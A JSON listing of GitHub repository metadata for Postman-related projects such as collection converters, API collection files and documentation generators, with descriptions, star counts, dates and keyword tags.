[
  {
    "user": "Loadium",
    "repo": "postman2jmx",
    "pulled": "Organization",
    "id": 165251524,
    "name": "postman2jmx",
    "full_name": "Loadium/postman2jmx",
    "description": "Postman collection to Jmeter jmx file converter ",
    "fork": false,
    "created_at": "2019-01-11T13:52:53Z",
    "updated_at": "2020-03-05T03:20:17Z",
    "forks": 21,
    "open_issues": 4,
    "watchers": 41,
    "network_count": 21,
    "subscribers_count": 4,
    "owner_id": 32220800,
    "owner_login": "Loadium",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/32220800?v=4",
    "owner_type": "Organization",
    "tags": [
      "collect",
      "collection",
      "file",
      "convert",
      "converte",
      "converter"
    ]
  },
  {
    "id": 20080659,
    "name": "blueman",
    "full_name": "kielabokkie/blueman",
    "description": "Convert a generated API Blueprint JSON file into a Postman collection",
    "fork": false,
    "created_at": "2014-05-22T23:35:40Z",
    "updated_at": "2020-01-21T19:33:30Z",
    "stargazers_count": 143,
    "watchers_count": 143,
    "forks": 18,
    "watchers": 143,
    "score": 1,
    "owner_id": 1221750,
    "owner_login": "kielabokkie",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/1221750?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "generate",
      "print",
      "generated"
    ]
  },
  {
    "user": "UnexpectedEOF",
    "repo": "paypal-rest-postman-collections",
    "pulled": "User",
    "id": 15839239,
    "name": "paypal-rest-postman-collections",
    "full_name": "UnexpectedEOF/paypal-rest-postman-collections",
    "description": "A couple of PayPal API collection files for the Postman REST client.",
    "fork": false,
    "created_at": "2014-01-12T08:50:36Z",
    "updated_at": "2020-03-05T15:19:51Z",
    "forks": 18,
    "open_issues": 1,
    "watchers": 28,
    "network_count": 18,
    "subscribers_count": 4,
    "owner_id": 494743,
    "owner_login": "UnexpectedEOF",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/494743?v=4",
    "owner_type": "User",
    "tags": [
      "collect",
      "collection",
      "file",
      "client",
      "files",
      "couple"
    ]
  },
  {
    "id": 152237532,
    "name": "ResponseToFile-Postman",
    "full_name": "sivcan/ResponseToFile-Postman",
    "description": "This project helps in writing response (or any data) from a postman request to a file",
    "fork": false,
    "created_at": "2018-10-09T11:12:41Z",
    "updated_at": "2020-03-12T15:29:09Z",
    "stargazers_count": 15,
    "watchers_count": 15,
    "forks": 7,
    "watchers": 15,
    "score": 1,
    "owner_id": 12631777,
    "owner_login": "sivcan",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/12631777?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "data",
      "request",
      "file",
      "help",
      "response",
      "helps",
      "writing"
    ]
  },
  {
    "user": "peopledoc",
    "repo": "swagman",
    "pulled": "Organization",
    "id": 91806219,
    "name": "swagman",
    "full_name": "peopledoc/swagman",
    "description": "Convert PostMan Collection Report to Swagger file",
    "fork": false,
    "created_at": "2017-05-19T13:00:40Z",
    "updated_at": "2020-02-18T15:04:37Z",
    "forks": 6,
    "open_issues": 6,
    "watchers": 26,
    "network_count": 6,
    "subscribers_count": 6,
    "owner_id": 1080062,
    "owner_login": "peopledoc",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/1080062?v=4",
    "owner_type": "Organization",
    "tags": [
      "file"
    ]
  },
  {
    "id": 107799476,
    "name": "intercom-postman-collection",
    "full_name": "thewheat/intercom-postman-collection",
    "description": "A Postman Collection file for the Intercom API http://developers.intercom.com/reference Includes extraction code to generate the latest version",
    "fork": false,
    "created_at": "2017-10-21T17:10:11Z",
    "updated_at": "2020-02-04T14:08:51Z",
    "stargazers_count": 7,
    "watchers_count": 7,
    "forks": 7,
    "watchers": 7,
    "score": 1,
    "owner_id": 892961,
    "owner_login": "thewheat",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/892961?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "file",
      "http",
      "develop",
      "code",
      "generate",
      "version",
      "developer",
      "action",
      "developers",
      "reference",
      "latest",
      "extract"
    ]
  },
  {
    "id": 27708836,
    "name": "postman2html",
    "full_name": "alioygur/postman2html",
    "description": "generating html file from a postman collection file",
    "fork": false,
    "created_at": "2014-12-08T10:06:02Z",
    "updated_at": "2019-12-06T14:33:17Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 3,
    "watchers": 4,
    "score": 1,
    "owner_id": 628322,
    "owner_login": "alioygur",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/628322?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "postman collection",
      "file",
      "rating",
      "html",
      "generating"
    ]
  },
  {
    "user": "ambertests",
    "repo": "charles_to_postman",
    "pulled": "User",
    "id": 104134243,
    "name": "charles_to_postman",
    "full_name": "ambertests/charles_to_postman",
    "description": "Script for converting Charlesproxy output to a Postman json file",
    "fork": false,
    "created_at": "2017-09-19T22:08:15Z",
    "updated_at": "2020-02-29T08:21:15Z",
    "forks": 4,
    "open_issues": 0,
    "watchers": 13,
    "network_count": 4,
    "subscribers_count": 1,
    "owner_id": 20446946,
    "owner_login": "ambertests",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/20446946?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "json",
      "convert",
      "proxy",
      "converting",
      "output"
    ]
  },
  {
    "user": "bukalapak",
    "repo": "vanadia",
    "pulled": "Organization",
    "id": 109925169,
    "name": "vanadia",
    "full_name": "bukalapak/vanadia",
    "description": "Export API Blueprint .apib file to Postman collection",
    "fork": false,
    "created_at": "2017-11-08T03:52:59Z",
    "updated_at": "2020-01-10T19:40:34Z",
    "forks": 4,
    "open_issues": 0,
    "watchers": 17,
    "network_count": 4,
    "subscribers_count": 13,
    "owner_id": 1088949,
    "owner_login": "bukalapak",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/1088949?v=4",
    "owner_type": "Organization",
    "tags": [
      "collect",
      "collection",
      "file",
      "print"
    ]
  },
  {
    "user": "tagomaru",
    "repo": "burp-extension-postman-integration",
    "pulled": "User",
    "id": 142982973,
    "name": "burp-extension-postman-integration",
    "full_name": "tagomaru/burp-extension-postman-integration",
    "description": "Postman Integration is an extension for burp to generate Postman collection fomat json file.",
    "fork": false,
    "created_at": "2018-07-31T08:07:51Z",
    "updated_at": "2020-01-27T22:34:01Z",
    "forks": 2,
    "open_issues": 0,
    "watchers": 5,
    "network_count": 2,
    "subscribers_count": 2,
    "owner_id": 17696068,
    "owner_login": "tagomaru",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/17696068?v=4",
    "owner_type": "User",
    "tags": [
      "collect",
      "collection",
      "file",
      "json",
      "generate",
      "extension",
      "burp"
    ]
  },
  {
    "user": "NordeaOB",
    "repo": "swaggers",
    "pulled": "User",
    "id": 123246010,
    "name": "swaggers",
    "full_name": "NordeaOB/swaggers",
    "description": "Nordea Open Banking API Swagger and Postman files",
    "fork": false,
    "created_at": "2018-02-28T07:22:55Z",
    "updated_at": "2020-03-19T11:28:17Z",
    "forks": 2,
    "open_issues": 1,
    "watchers": 14,
    "network_count": 2,
    "subscribers_count": 6,
    "owner_id": 29456424,
    "owner_login": "NordeaOB",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/29456424?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "files"
    ]
  },
  {
    "user": "rodydavis",
    "repo": "Tesla-API",
    "pulled": "User",
    "id": 154551159,
    "name": "Tesla-API",
    "full_name": "rodydavis/Tesla-API",
    "description": "Postman files for Tesla API Testing",
    "fork": false,
    "created_at": "2018-10-24T18:45:04Z",
    "updated_at": "2019-11-01T13:17:22Z",
    "forks": 2,
    "open_issues": 0,
    "watchers": 6,
    "network_count": 2,
    "subscribers_count": 0,
    "owner_id": 31253215,
    "owner_login": "rodydavis",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/31253215?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "files"
    ]
  },
  {
    "user": "ivantw08",
    "repo": "PostmanAutoDocument",
    "pulled": "User",
    "id": 136418807,
    "name": "PostmanAutoDocument",
    "full_name": "ivantw08/PostmanAutoDocument",
    "description": "This project allow you to auto generate html file for document",
    "fork": false,
    "created_at": "2018-06-07T03:48:04Z",
    "updated_at": "2018-07-04T01:48:50Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 5,
    "network_count": 0,
    "subscribers_count": 0,
    "owner_id": 28133026,
    "owner_login": "ivantw08",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/28133026?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "document",
      "auto",
      "generate",
      "html"
    ]
  },
  {
    "user": "devopsfaith",
    "repo": "krakend-postman",
    "pulled": "Organization",
    "id": 155447231,
    "name": "krakend-postman",
    "full_name": "devopsfaith/krakend-postman",
    "description": "Create automatic POSTMAN collection descriptions from you KrakenD config file",
    "fork": false,
    "created_at": "2018-10-30T19:50:51Z",
    "updated_at": "2020-01-23T07:44:47Z",
    "forks": 1,
    "open_issues": 1,
    "watchers": 8,
    "network_count": 1,
    "subscribers_count": 2,
    "owner_id": 23139751,
    "owner_login": "devopsfaith",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/23139751?v=4",
    "owner_type": "Organization",
    "tags": [
      "collect",
      "collection",
      "file",
      "script",
      "auto",
      "automat",
      "config",
      "automatic",
      "desc",
      "description",
      "descriptions",
      "rake"
    ]
  },
  {
    "user": "paulvollmer",
    "repo": "PostmanCollectionProgrammatically",
    "pulled": "User",
    "id": 25114927,
    "name": "PostmanCollectionProgrammatically",
    "full_name": "paulvollmer/PostmanCollectionProgrammatically",
    "description": "Create Postman collection json file programmatically.",
    "fork": false,
    "created_at": "2014-10-12T09:20:03Z",
    "updated_at": "2018-10-25T07:40:42Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 3,
    "network_count": 0,
    "subscribers_count": 3,
    "owner_id": 235200,
    "owner_login": "paulvollmer",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/235200?v=4",
    "owner_type": "User",
    "tags": [
      "collect",
      "collection",
      "file",
      "call",
      "json",
      "program",
      "programmatically"
    ]
  },
  {
    "user": "udartsev",
    "repo": "LaravelPostmanExport",
    "pulled": "User",
    "id": 191168070,
    "name": "LaravelPostmanExport",
    "full_name": "udartsev/LaravelPostmanExport",
    "description": "Laravel 5.8+ package to create Postman_collection.json file with Laravel routes",
    "fork": false,
    "created_at": "2019-06-10T12:56:05Z",
    "updated_at": "2020-03-03T02:41:09Z",
    "forks": 1,
    "open_issues": 3,
    "watchers": 6,
    "network_count": 1,
    "subscribers_count": 0,
    "owner_id": 36134794,
    "owner_login": "udartsev",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/36134794?v=4",
    "owner_type": "User",
    "tags": [
      "collect",
      "collection",
      "create",
      "file",
      "json",
      "route",
      "routes",
      "package"
    ]
  },
  {
    "user": "rafi",
    "repo": "req8",
    "pulled": "User",
    "id": 111075180,
    "name": "req8",
    "full_name": "rafi/req8",
    "description": "Manage HTTP RESTful APIs per-project in YAML files (Postman alternative for the terminal)",
    "fork": false,
    "created_at": "2017-11-17T08:01:58Z",
    "updated_at": "2019-08-01T17:13:11Z",
    "forks": 2,
    "open_issues": 1,
    "watchers": 5,
    "network_count": 2,
    "subscribers_count": 2,
    "owner_id": 147918,
    "owner_login": "rafi",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/147918?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "files",
      "native",
      "terminal",
      "alternative"
    ]
  },
  {
    "user": "sqren",
    "repo": "tsapi-electron",
    "pulled": "User",
    "id": 57342170,
    "name": "tsapi-electron",
    "full_name": "sqren/tsapi-electron",
    "description": "Postman-like app, but with configuration files...",
    "fork": false,
    "created_at": "2016-04-29T00:16:23Z",
    "updated_at": "2019-06-25T06:58:12Z",
    "forks": 2,
    "open_issues": 0,
    "watchers": 1,
    "network_count": 2,
    "subscribers_count": 1,
    "owner_id": 209966,
    "owner_login": "sqren",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/209966?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "files",
      "config",
      "configuration"
    ]
  },
  {
    "user": "aviman1109",
    "repo": "PostmanToMD",
    "pulled": "User",
    "id": 204286589,
    "name": "PostmanToMD",
    "full_name": "aviman1109/PostmanToMD",
    "description": "Convert Postman Collection to gitbook api file",
    "fork": false,
    "created_at": "2019-08-25T11:44:50Z",
    "updated_at": "2020-01-18T23:05:27Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 2,
    "network_count": 0,
    "subscribers_count": 1,
    "owner_id": 16783092,
    "owner_login": "aviman1109",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/16783092?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "book",
      "gitbook"
    ]
  },
  {
    "user": "vishnoitanuj",
    "repo": "Blockchain-Cryptocurrency",
    "pulled": "User",
    "id": 158826019,
    "name": "Blockchain-Cryptocurrency",
    "full_name": "vishnoitanuj/Blockchain-Cryptocurrency",
    "description": "A basic implementation of blockchain based on flask server. It servers the basics of crypto-currency technology. The genesis, block constructor and its use are explained in the read-me file. Any suggestions are welcomed.",
    "fork": false,
    "created_at": "2018-11-23T11:50:24Z",
    "updated_at": "2020-02-13T17:04:10Z",
    "forks": 2,
    "open_issues": 1,
    "watchers": 3,
    "network_count": 2,
    "subscribers_count": 0,
    "owner_id": 26393267,
    "owner_login": "vishnoitanuj",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26393267?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "server",
      "based",
      "implement",
      "read",
      "implementation",
      "struct",
      "tech",
      "chai",
      "currency",
      "flask",
      "crypto",
      "blockchain",
      "plain",
      "servers",
      "basics",
      "technology",
      "explain",
      "suggest",
      "welcome"
    ]
  },
  {
    "user": "openMF",
    "repo": "mifos-io-configuration",
    "pulled": "Organization",
    "id": 212333922,
    "name": "mifos-io-configuration",
    "full_name": "openMF/mifos-io-configuration",
    "description": "Config files, postman queries, documentation for Mifos.io lab environment",
    "fork": false,
    "created_at": "2019-10-02T12:22:36Z",
    "updated_at": "2020-03-21T00:09:20Z",
    "forks": 2,
    "open_issues": 0,
    "watchers": 0,
    "network_count": 2,
    "subscribers_count": 6,
    "owner_id": 3473607,
    "owner_login": "openMF",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/3473607?v=4",
    "owner_type": "Organization",
    "tags": [
      " postman",
      "file",
      "document",
      "environment",
      "files",
      "documentation",
      "queries"
    ]
  },
  {
    "user": "pozil",
    "repo": "postman-extractor",
    "pulled": "User",
    "id": 233596452,
    "name": "postman-extractor",
    "full_name": "pozil/postman-extractor",
    "description": "Postman Extractor (pmx) is a utility that extracts/compacts resources from Postman export files for easier versioning.",
    "fork": false,
    "created_at": "2020-01-13T13:00:39Z",
    "updated_at": "2020-03-16T08:08:56Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 2,
    "network_count": 0,
    "subscribers_count": 1,
    "owner_id": 5071767,
    "owner_login": "pozil",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/5071767?v=4",
    "owner_type": "User",
    "tags": [
      "file",
      "files",
      "util",
      "export",
      "source",
      "version",
      "resource",
      "resources",
      "utility",
      "actor",
      "easier",
      "pact",
      "extract",
      "versioning"
    ]
  },
  {
    "user": "ITV",
    "repo": "pmpact",
    "pulled": "Organization",
    "id": 146436088,
    "name": "pmpact",
    "full_name": "ITV/pmpact",
    "description": "A command line tool to convert Pact files to Postman collections.",
    "fork": false,
    "created_at": "2018-08-28T11:14:37Z",
    "updated_at": "2019-09-23T17:25:19Z",
    "forks": 1,
    "open_issues": 1,
    "watchers": 5,
    "network_count": 1,
    "subscribers_count": 44,
    "owner_id": 625148,
    "owner_login": "ITV",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/625148?v=4",
    "owner_type": "Organization",
    "tags": [
      "collect",
      "collection",
      "collections",
      "file",
      "tool",
      "convert",
      "line",
      "files",
      "command",
      "command line"
    ]
  },
  {
    "id": 148390691,
    "name": "buildman",
    "full_name": "bcariaga/buildman",
    "description": "A tool for making files from a Postman Collection and vice versa",
    "fork": false,
    "created_at": "2018-09-11T23:00:55Z",
    "updated_at": "2020-01-24T20:27:34Z",
    "stargazers_count": 5,
    "watchers_count": 5,
    "forks": 0,
    "watchers": 5,
    "score": 1,
    "owner_id": 19692921,
    "owner_login": "bcariaga",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/19692921?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "tool",
      "files",
      "making"
    ]
  },
  {
    "id": 191168070,
    "name": "LaravelPostmanExport",
    "full_name": "udartsev/LaravelPostmanExport",
    "description": "Laravel 5.8+ package to create Postman_collection.json file with Laravel routes",
    "fork": false,
    "created_at": "2019-06-10T12:56:05Z",
    "updated_at": "2020-03-03T02:41:09Z",
    "stargazers_count": 6,
    "watchers_count": 6,
    "forks": 1,
    "watchers": 6,
    "score": 1,
    "owner_id": 36134794,
    "owner_login": "udartsev",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/36134794?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "create",
      "file",
      "json",
      "route",
      "routes",
      "package"
    ]
  },
  {
    "id": 137139268,
    "name": "Node_Postman",
    "full_name": "lkkushan101/Node_Postman",
    "description": null,
    "fork": false,
    "created_at": "2018-06-12T23:44:11Z",
    "updated_at": "2018-06-13T04:28:31Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 2,
    "watchers": 1,
    "score": 1,
    "owner_id": 35223257,
    "owner_login": "lkkushan101",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/35223257?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 25114927,
    "name": "PostmanCollectionProgrammatically",
    "full_name": "paulvollmer/PostmanCollectionProgrammatically",
    "description": "Create Postman collection json file programmatically.",
    "fork": false,
    "created_at": "2014-10-12T09:20:03Z",
    "updated_at": "2018-10-25T07:40:42Z",
    "stargazers_count": 3,
    "watchers_count": 3,
    "forks": 0,
    "watchers": 3,
    "score": 1,
    "owner_id": 235200,
    "owner_login": "paulvollmer",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/235200?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "call",
      "json",
      "program",
      "programmatically"
    ]
  },
  {
    "id": 111075180,
    "name": "req8",
    "full_name": "rafi/req8",
    "description": "Manage HTTP RESTful APIs per-project in YAML files (Postman alternative for the terminal)",
    "fork": false,
    "created_at": "2017-11-17T08:01:58Z",
    "updated_at": "2019-08-01T17:13:11Z",
    "stargazers_count": 5,
    "watchers_count": 5,
    "forks": 2,
    "watchers": 5,
    "score": 1,
    "owner_id": 147918,
    "owner_login": "rafi",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/147918?v=4",
    "tags": [
      "file",
      "files",
      "native",
      "terminal",
      "alternative"
    ]
  },
  {
    "id": 57342170,
    "name": "tsapi-electron",
    "full_name": "sqren/tsapi-electron",
    "description": "Postman-like app, but with configuration files...",
    "fork": false,
    "created_at": "2016-04-29T00:16:23Z",
    "updated_at": "2019-06-25T06:58:12Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 2,
    "watchers": 1,
    "score": 1,
    "owner_id": 209966,
    "owner_login": "sqren",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/209966?v=4",
    "tags": [
      "file",
      "files",
      "config",
      "configuration"
    ]
  },
  {
    "id": 204286589,
    "name": "PostmanToMD",
    "full_name": "aviman1109/PostmanToMD",
    "description": "Convert Postman Collection to gitbook api file",
    "fork": false,
    "created_at": "2019-08-25T11:44:50Z",
    "updated_at": "2020-01-18T23:05:27Z",
    "stargazers_count": 2,
    "watchers_count": 2,
    "forks": 0,
    "watchers": 2,
    "score": 1,
    "owner_id": 16783092,
    "owner_login": "aviman1109",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/16783092?v=4",
    "tags": [
      "file",
      "book",
      "gitbook"
    ]
  },
  {
    "id": 158826019,
    "name": "Blockchain-Cryptocurrency",
    "full_name": "vishnoitanuj/Blockchain-Cryptocurrency",
    "description": "A basic implementation of blockchain based on flask server. It servers the basics of crypto-currency technology. The genesis, block constructor and its use are explained in the read-me file. Any suggestions are welcomed.",
    "fork": false,
    "created_at": "2018-11-23T11:50:24Z",
    "updated_at": "2020-02-13T17:04:10Z",
    "stargazers_count": 3,
    "watchers_count": 3,
    "forks": 2,
    "watchers": 3,
    "score": 1,
    "owner_id": 26393267,
    "owner_login": "vishnoitanuj",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26393267?v=4",
    "tags": [
      "file",
      "server",
      "based",
      "implement",
      "read",
      "implementation",
      "struct",
      "tech",
      "chai",
      "currency",
      "flask",
      "crypto",
      "blockchain",
      "plain",
      "servers",
      "basics",
      "technology",
      "explain",
      "suggest",
      "welcome"
    ]
  },
  {
    "id": 212333922,
    "name": "mifos-io-configuration",
    "full_name": "openMF/mifos-io-configuration",
    "description": "Config files, postman queries, documentation for Mifos.io lab environment",
    "fork": false,
    "created_at": "2019-10-02T12:22:36Z",
    "updated_at": "2020-03-21T00:09:20Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 2,
    "watchers": 0,
    "score": 1,
    "owner_id": 3473607,
    "owner_login": "openMF",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/3473607?v=4",
    "tags": [
      " postman",
      "file",
      "document",
      "environment",
      "files",
      "documentation",
      "queries"
    ]
  },
  {
    "id": 233596452,
    "name": "postman-extractor",
    "full_name": "pozil/postman-extractor",
    "description": "Postman Extractor (pmx) is a utility that extracts/compacts resources from Postman export files for easier versioning.",
    "fork": false,
    "created_at": "2020-01-13T13:00:39Z",
    "updated_at": "2020-03-16T08:08:56Z",
    "stargazers_count": 2,
    "watchers_count": 2,
    "forks": 0,
    "watchers": 2,
    "score": 1,
    "owner_id": 5071767,
    "owner_login": "pozil",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/5071767?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "files",
      "util",
      "export",
      "source",
      "version",
      "resource",
      "resources",
      "utility",
      "actor",
      "easier",
      "pact",
      "extract",
      "versioning"
    ]
  },
  {
    "id": 146436088,
    "name": "pmpact",
    "full_name": "ITV/pmpact",
    "description": "A command line tool to convert Pact files to Postman collections.",
    "fork": false,
    "created_at": "2018-08-28T11:14:37Z",
    "updated_at": "2019-09-23T17:25:19Z",
    "stargazers_count": 5,
    "watchers_count": 5,
    "forks": 1,
    "watchers": 5,
    "score": 1,
    "owner_id": 625148,
    "owner_login": "ITV",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/625148?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "collections",
      "file",
      "tool",
      "convert",
      "line",
      "files",
      "command",
      "command line"
    ]
  },
  {
    "id": 200176857,
    "name": "EXPRESS-API",
    "full_name": "SandhyaHV/EXPRESS-API",
    "description": "API consisting of credential entry and profile view using postman",
    "fork": false,
    "created_at": "2019-08-02T06:17:54Z",
    "updated_at": "2019-08-02T06:43:59Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 52645782,
    "owner_login": "SandhyaHV",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/52645782?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "view",
      "profile",
      "consist",
      "consisting"
    ]
  },
  {
    "id": 240128652,
    "name": "TestingBackup",
    "full_name": "tvaroglu/TestingBackup",
    "description": "Backup repo for Postman and k6 testing files",
    "fork": false,
    "created_at": "2020-02-12T22:29:58Z",
    "updated_at": "2020-03-23T15:11:07Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 58891447,
    "owner_login": "tvaroglu",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/58891447?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "testing",
      "file",
      "files"
    ]
  },
  {
    "id": 136601277,
    "name": "swag-post-gen",
    "full_name": "sharrop/swag-post-gen",
    "description": "A Swagger(OAS)v2-to-Postman generator - very much sitting on the shoulders of the excellent npm:swagger2-postman-generator module, but injecting Postman tests for required fields and type conformance - derived from the Swagger/OAS file.",
    "fork": false,
    "created_at": "2018-06-08T09:57:09Z",
    "updated_at": "2018-06-08T09:59:52Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 10855105,
    "owner_login": "sharrop",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/10855105?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "form",
      "file",
      "tests",
      "tests ",
      "swagger",
      "very",
      "generator",
      "module",
      "type",
      "require",
      "should",
      "required",
      "swagger2",
      "excel",
      "inject",
      "fields",
      "much"
    ]
  },
  {
    "id": 136418807,
    "name": "PostmanAutoDocument",
    "full_name": "ivantw08/PostmanAutoDocument",
    "description": "This project allow you to auto generate html file for document",
    "fork": false,
    "created_at": "2018-06-07T03:48:04Z",
    "updated_at": "2018-07-04T01:48:50Z",
    "stargazers_count": 5,
    "watchers_count": 5,
    "forks": 0,
    "watchers": 5,
    "score": 1,
    "owner_id": 28133026,
    "owner_login": "ivantw08",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/28133026?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "document",
      "auto",
      "generate",
      "html"
    ]
  },
  {
    "id": 142982973,
    "name": "burp-extension-postman-integration",
    "full_name": "tagomaru/burp-extension-postman-integration",
    "description": "Postman Integration is an extension for burp to generate Postman collection fomat json file.",
    "fork": false,
    "created_at": "2018-07-31T08:07:51Z",
    "updated_at": "2020-01-27T22:34:01Z",
    "stargazers_count": 5,
    "watchers_count": 5,
    "forks": 2,
    "watchers": 5,
    "score": 1,
    "owner_id": 17696068,
    "owner_login": "tagomaru",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/17696068?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "json",
      "generate",
      "extension",
      "burp"
    ]
  },
  {
    "id": 28899066,
    "name": "postman",
    "full_name": "foonster/postman",
    "description": "Postman is a generic PHP processing script to the e-mail gateway that \n parses the results of any form and sends them to the specified users. This \n script has many formatting and operational options, most of which can be \n specified within a variable file \"_variables.php\" each form.\n",
    "fork": false,
    "created_at": "2015-01-07T04:59:40Z",
    "updated_at": "2018-07-26T21:34:17Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 1919734,
    "owner_login": "foonster",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/1919734?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "file",
      "script",
      "user",
      "format",
      "mail",
      "operation",
      "send",
      "spec",
      "users",
      "result",
      "parse",
      "results",
      "variable",
      "within",
      "process",
      "many",
      "gateway",
      "variables",
      "sends",
      "generic",
      "operationa",
      "options",
      "parses"
    ]
  },
  {
    "id": 199917222,
    "name": "postman",
    "full_name": "internetisalie/postman",
    "description": "Golang HTTP Tests Code Generator directly from Postman JSON export file",
    "fork": false,
    "created_at": "2019-07-31T19:30:38Z",
    "updated_at": "2020-01-07T19:06:27Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16406328,
    "owner_login": "internetisalie",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/16406328?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "export",
      "lang",
      "directly"
    ]
  },
  {
    "id": 235620707,
    "name": "Postman",
    "full_name": "AndyQA/Postman",
    "description": null,
    "fork": false,
    "created_at": "2020-01-22T16:58:23Z",
    "updated_at": "2020-01-22T16:59:15Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 59971174,
    "owner_login": "AndyQA",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/59971174?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 246538571,
    "name": "postman",
    "full_name": "tongthai2240/postman",
    "description": null,
    "fork": false,
    "created_at": "2020-03-11T10:14:01Z",
    "updated_at": "2020-03-11T10:17:20Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 60963425,
    "owner_login": "tongthai2240",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/60963425?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 89928111,
    "name": "postman",
    "full_name": "maherAbuyounes/postman",
    "description": "postman after added tow files ",
    "fork": false,
    "created_at": "2017-05-01T13:53:36Z",
    "updated_at": "2017-05-01T13:53:36Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 28260420,
    "owner_login": "maherAbuyounes",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/28260420?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "files",
      "added"
    ]
  },
  {
    "id": 92912619,
    "name": "Postman",
    "full_name": "zhengdafu666/Postman",
    "description": null,
    "fork": false,
    "created_at": "2017-05-31T06:30:47Z",
    "updated_at": "2017-05-31T06:30:47Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29087073,
    "owner_login": "zhengdafu666",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/29087073?v=4",
    "pulled": 1,
    "tags": []
  },
  {
